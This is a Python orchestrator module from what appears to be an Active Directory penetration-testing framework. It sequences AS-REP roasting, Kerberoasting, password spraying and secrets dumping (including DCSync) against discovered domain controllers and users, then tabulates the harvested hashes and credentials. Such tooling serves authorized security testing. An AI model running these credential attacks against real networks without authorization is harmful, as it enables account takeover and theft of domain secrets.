"""Phase 3 orchestrator - credential harvesting.

1. Pulls users / DCs / credentials from the :class:`TargetManager`
   populated by Phase 1.
2. Sequences the three sub-modules that have a separate concern:

   * :class:`ASREPRoaster` - passive-ish; runs in safe mode too because
     it only sends AS-REQ for accounts we already enumerated.
   * :class:`Kerberoaster` - needs a credential; skipped in safe mode.
   * :class:`PasswordSprayer` - active; strictly skipped in safe mode.
   * :class:`SecretsDumper` - active; strictly skipped in safe mode.

3. Emits a Phase 3 summary table.

Under the ``credentials:`` configuration block, every action is
independently switchable.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from rich.table import Table

from core.logger import get_logger
from core.target_manager import Credential, TargetManager
from modules.credentials.dumping import DumpMode, DumpResult, SecretsDumper
from modules.credentials.roasting import ASREPRoaster, Kerberoaster, RoastResult
from modules.credentials.spraying import PasswordSprayer, SprayResult


@dataclass
class CredentialsPhaseResult:
    asreproast: RoastResult | None = None
    kerberoast: RoastResult | None = None
    spray: SprayResult | None = None
    dumps: list[DumpResult] = field(default_factory=list)


class CredentialManager:
    """Run Phase 3 end to end."""

    def __init__(self, config: dict, tm: TargetManager):
        self.cfg = config
        self.tm = tm
        self.log = get_logger()

        self.safe_mode = bool(
            self.cfg.get("engagement", {}).get("safe_mode", False)
        )
        self.stealth_mode = bool(
            self.cfg.get("engagement", {}).get("stealth_mode", False)
        )
        self.cred_cfg: dict[str, Any] = self.cfg.get("credentials", {}) or {}
        self.domain: str = self.cfg.get("domain") or self._infer_domain()

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _infer_domain(self) -> str:
        for h in self.tm.alive_hosts():
            if h.is_dc and h.domain:
                return h.domain
        return ""

    def _kdc_ip(self) -> str:
        explicit = self.cred_cfg.get("kdc_ip")
        if explicit:
            return explicit
        dcs = self.tm.dcs()
        return dcs[0].ip if dcs else ""

    def _pick_credential(self) -> Credential | None:
        """Return the first known credential we can authenticate with.

        Preference order: explicit YAML credential block, then any
        password-bearing :class:`Credential` from the engagement state,
        then the first NT-hash credential.
        """
        manual = self.cred_cfg.get("credential") or {}
        if manual.get("username") and (
            manual.get("password") or manual.get("nthash")
        ):
            return Credential(
                username=manual["username"],
                domain=manual.get("domain", self.domain),
                password=manual.get("password"),
                nt_hash=manual.get("nthash"),
                source="config",
            )
        for c in self.tm.credentials:
            if c.password:
                return c
        # Guard on ``real_nt_hash``: a roasting ``$krb5*`` blob lives in the
        # ``nt_hash`` slot but cannot authenticate, so it must never be picked
        # as the credential that drives kerberoast / dumping ``-hashes``.
        for c in self.tm.credentials:
            if c.real_nt_hash:
                return c
        return None

    # ------------------------------------------------------------------
    # Sub-runs
    # ------------------------------------------------------------------

    def _run_asreproast(self) -> RoastResult | None:
        cfg = self.cred_cfg.get("asreproast", {}) or {}
        if not cfg.get("enabled", True):
            self.log.info("asreproast: disabled in config - skipping")
            return None
        self.log.info("asreproast: enabled")
        cred = self._pick_credential()
        roaster = ASREPRoaster(
            tm=self.tm,
            domain=self.domain,
            kdc_ip=self._kdc_ip(),
            loot_dir=self.cfg.get("logging", {}).get("loot_dir", "./loot"),
            username=cred.username if cred else "",
            password=cred.password or "" if cred else "",
            nthash=cred.real_nt_hash or "" if cred else "",
            timeout=int(cfg.get("timeout", 120)),
            safe_mode=self.safe_mode,
        )
        return roaster.run()

    def _run_kerberoast(self) -> RoastResult | None:
        cfg = self.cred_cfg.get("kerberoast", {}) or {}
        if not cfg.get("enabled", True):
            self.log.info("kerberoast: disabled in config - skipping")
            return None
        self.log.info("kerberoast: enabled")
        cred = self._pick_credential()
        if cred is None:
            self.log.warn(
                "kerberoast skipped: no credential available "
                "(needs at least one valid account)"
            )
            return None
        roaster = Kerberoaster(
            tm=self.tm,
            domain=self.domain,
            kdc_ip=self._kdc_ip(),
            loot_dir=self.cfg.get("logging", {}).get("loot_dir", "./loot"),
            username=cred.username,
            password=cred.password or "",
            nthash=cred.real_nt_hash or "",
            timeout=int(cfg.get("timeout", 120)),
            safe_mode=self.safe_mode,
        )
        return roaster.run()

    def _run_spray(self) -> SprayResult | None:
        cfg = self.cred_cfg.get("spraying", {}) or {}
        if not cfg.get("enabled", False):
            self.log.info("spraying: disabled in config - skipping")
            return None
        self.log.info("spraying: enabled")

        passwords = list(cfg.get("passwords") or [])
        targets = list(cfg.get("targets") or [])
        if not targets:
            targets = [h.ip for h in self.tm.dcs()]
            self.log.info(
                f"spraying: targets auto-discovered ({len(targets)} DC(s))"
            )

        # Treat both ``users: null`` and ``users: []`` as "fall back to
        # recon-discovered users" - supplying an empty list explicitly
        # would otherwise short-circuit the wrapper with "no users".
        configured_users = cfg.get("users") or None
        if configured_users is None:
            self.log.info(
                f"spraying: users auto-discovered "
                f"({len(self.tm.users)} from Phase 1 user_enum)"
            )

        sprayer = PasswordSprayer(
            tm=self.tm,
            domain=self.domain,
            targets=targets,
            passwords=passwords,
            users=configured_users,
            protocol=cfg.get("protocol", "smb"),
            lockout_threshold=cfg.get("lockout_threshold"),
            safety_margin=int(cfg.get("safety_margin", 2)),
            probe_password_policy=bool(
                cfg.get("probe_password_policy", True)
            ),
            timeout=int(cfg.get("timeout", 300)),
            loot_dir=self.cfg.get("logging", {}).get("loot_dir", "./loot"),
            safe_mode=self.safe_mode,
            stealth_mode=self.stealth_mode,
        )
        return sprayer.run()

    def _run_dumps(self) -> list[DumpResult]:
        cfg = self.cred_cfg.get("dumping", {}) or {}
        if not cfg.get("enabled", False):
            self.log.info("dumping: disabled in config - skipping")
            return []
        self.log.info("dumping: enabled")

        results: list[DumpResult] = []
        for entry in cfg.get("operations", []) or []:
            mode_raw = entry.get("mode", "local")
            try:
                mode = DumpMode(mode_raw)
            except ValueError:
                self.log.warn(f"Unknown dump mode {mode_raw!r} - skipping")
                continue
            cred_block = entry.get("credential") or {}
            cred = self._pick_credential() if not cred_block else None
            username = cred_block.get("username") or (cred.username if cred else "")
            password = cred_block.get("password") or (
                (cred.password or "") if cred else ""
            )
            nthash = cred_block.get("nthash") or (
                (cred.real_nt_hash or "") if cred else ""
            )

            target = entry.get("target") or self._default_dump_target(mode)
            dumper = SecretsDumper(
                tm=self.tm,
                mode=mode,
                target=target,
                domain=entry.get("domain", self.domain),
                username=username,
                password=password,
                nthash=nthash,
                ntds_file=entry.get("ntds_file"),
                system_hive=entry.get("system_hive"),
                loot_dir=self.cfg.get("logging", {}).get("loot_dir", "./loot"),
                timeout=int(entry.get("timeout", 600)),
                safe_mode=self.safe_mode,
            )
            results.append(dumper.run())
        return results

    def _default_dump_target(self, mode: DumpMode) -> str:
        if mode is DumpMode.DCSYNC:
            dcs = self.tm.dcs()
            return dcs[0].ip if dcs else ""
        return ""

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------

    def run(self) -> CredentialsPhaseResult:
        result = CredentialsPhaseResult()

        if not self.domain:
            self.log.warn(
                "Phase 3: domain unknown - some attacks will be skipped. "
                "Run Phase 1 first or set ``domain`` in the config."
            )

        result.asreproast = self._run_asreproast()
        result.kerberoast = self._run_kerberoast()
        result.spray = self._run_spray()
        result.dumps = self._run_dumps()

        self._print_summary(result)
        return result

    # ------------------------------------------------------------------
    # Summary
    # ------------------------------------------------------------------

    def _print_summary(self, result: CredentialsPhaseResult) -> None:
        console = self.log.console
        t = Table(title="Phase 3 - Summary", show_lines=False)
        t.add_column("Component", style="bold blue")
        t.add_column("Status", style="cyan")
        t.add_column("Details", style="white")

        if result.asreproast:
            t.add_row(
                "asreproast",
                result.asreproast.status,
                f"{len(result.asreproast.hashes)} hash(es)",
            )
        if result.kerberoast:
            t.add_row(
                "kerberoast",
                result.kerberoast.status,
                f"{len(result.kerberoast.hashes)} TGS hash(es)",
            )
        if result.spray:
            t.add_row(
                "spray",
                result.spray.status,
                f"{len(result.spray.valid)} hit(s) / "
                f"{result.spray.attempts} attempt(s)",
            )
        for d in result.dumps:
            t.add_row(
                f"dump/{d.mode}",
                d.status,
                f"{len(d.credentials)} credential(s) "
                f"from {d.target or 'offline'}",
            )

        if t.row_count:
            console.print(t)
        else:
            self.log.info("Phase 3 ran with no enabled components.")
